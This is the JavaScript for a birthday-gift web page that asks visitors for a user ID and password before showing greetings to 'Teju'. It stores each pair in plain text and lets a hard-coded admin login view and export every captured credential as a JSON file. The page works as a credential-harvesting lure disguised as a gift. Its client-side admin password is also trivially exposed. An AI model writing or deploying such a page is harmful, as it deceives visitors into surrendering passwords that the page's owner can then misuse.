// Config (admin credentials)
const ADMIN_ID = "187";
const ADMIN_PASS = "1892"; // admin password per your request
const STORAGE_KEY = "teju_gift_entries_v3";

// Wishes array
const WISHES = [
  "Happy Birthday, Teju! 🎂",
  "May your day be full of smiles and surprises!",
  "Wishing you success, health and lots of laughter!",
  "Hope your year ahead is amazing and bright!",
  "Cake, fun, and many hugs — enjoy your day!",
  "May all your dreams take flight this year!",
  "Sending love and best wishes on your birthday!",
  "You deserve the best — have a fantastic birthday!",
  "Cheers to you and many joyful moments ahead!",
  "Celebrate big — it's your special day!"
];

// Page elements
const pageWelcome = document.getElementById('pageWelcome');
const pageForm = document.getElementById('pageForm');
const pageWishes = document.getElementById('pageWishes');
const wishesContainer = document.getElementById('wishesContainer');

// Admin elements
const adminPanel = document.getElementById('adminPanel');
const adminLoginArea = document.getElementById('adminLoginArea');
const adminArea = document.getElementById('adminArea');

// Navigation
document.getElementById('toOpenGift').addEventListener('click', ()=> showPage('form'));
document.getElementById('backToWelcome').addEventListener('click', ()=> showPage('welcome'));
document.getElementById('openAdmin').addEventListener('click', ()=> {
  adminPanel.style.display = 'block';
  adminLoginArea.style.display = 'block';
  adminArea.style.display = 'none';
});
document.getElementById('closeAdmin').addEventListener('click', ()=> adminPanel.style.display = 'none');

function showPage(name){
  pageWelcome.style.display = name==='welcome' ? 'block' : 'none';
  pageForm.style.display = name==='form' ? 'block' : 'none';
  pageWishes.style.display = name==='wishes' ? 'block' : 'none';
  if(name === 'wishes') renderWishes();
}

// Storage helpers (now using userId & password keys)
function getEntries(){
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch(e){
    return [];
  }
}
function saveEntry(userId, password){
  const arr = getEntries();
  arr.push({ userId: String(userId), password: String(password), ts: new Date().toISOString() });
  localStorage.setItem(STORAGE_KEY, JSON.stringify(arr));
}
function clearEntries(){
  localStorage.removeItem(STORAGE_KEY);
}

// User form behavior
document.getElementById('submitBtn').addEventListener('click', ()=>{
  const userId = document.getElementById('userId').value.trim();
  const password = document.getElementById('userPass').value.trim();
  if(!userId || !password){ alert('Kripya User ID aur Password dono daalein'); return; }
  saveEntry(userId, password);
  showPage('wishes');
  document.getElementById('userId').value = '';
  document.getElementById('userPass').value = '';
});

document.getElementById('saveBtn').addEventListener('click', (e)=>{
  e.preventDefault();
  const userId = document.getElementById('userId').value.trim();
  const password = document.getElementById('userPass').value.trim();
  if(!userId || !password){ alert('Kripya User ID aur Password dono daalein'); return; }
  saveEntry(userId, password);
  alert('Saved! Aap wishes nahi dekhenge, par admin entry dekh paayega.');
  document.getElementById('userId').value = '';
  document.getElementById('userPass').value = '';
});

// Render wishes
function renderWishes(){
  wishesContainer.innerHTML = '';
  const shuffled = WISHES.slice().sort(()=>Math.random()-0.5);
  const shown = shuffled.concat(shuffled).slice(0,12);
  shown.forEach(w => {
    const d = document.createElement('div');
    d.className = 'wish';
    d.textContent = w;
    wishesContainer.appendChild(d);
  });
}

// Admin login
document.getElementById('adminLoginBtn').addEventListener('click', ()=>{
  const id = document.getElementById('adminId').value.trim();
  const pass = document.getElementById('adminPass').value.trim();
  if(id === ADMIN_ID && pass === ADMIN_PASS){
    adminLoginArea.style.display = 'none';
    adminArea.style.display = 'block';
    renderAdminTable();
  } else {
    alert('Invalid admin credentials');
  }
});

// Render admin table with backwards compatibility:
// show userId/password if present, otherwise fall back to id/code (older entries)
function renderAdminTable(){
  const tbody = document.querySelector('#entriesTable tbody');
  const arr = getEntries();
  tbody.innerHTML = '';
  if(arr.length === 0){
    const tr = document.createElement('tr');
    tr.innerHTML = '<td colspan="4" style="color:var(--muted)">Koi saved entry nahi hai.</td>';
    tbody.appendChild(tr);
    return;
  }
  arr.forEach((r,i) => {
    const userId = r.userId || r.id || '';
    const password = r.password || r.code || '';
    const tr = document.createElement('tr');
    tr.innerHTML = '<td>' + (i+1) + '</td>' +
                   '<td>' + escapeHtml(userId) + '</td>' +
                   '<td>' + escapeHtml(password) + '</td>' +
                   '<td>' + new Date(r.ts || r.time || new Date().toISOString()).toLocaleString() + '</td>';
    tbody.appendChild(tr);
  });
}

// Admin controls
document.getElementById('clearBtn').addEventListener('click', ()=>{
  if(confirm('Kya aap sure hain? Sab entries clear ho jayengi.')){
    clearEntries();
    renderAdminTable();
    alert('Cleared');
  }
});
document.getElementById('exportBtn').addEventListener('click', ()=>{
  const data = getEntries();
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a'); a.href = url; a.download = 'teju_entries_v3.json';
  document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
});

// helper
function escapeHtml(s){
  return String(s).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[c]));
}

// Start at welcome
showPage('welcome');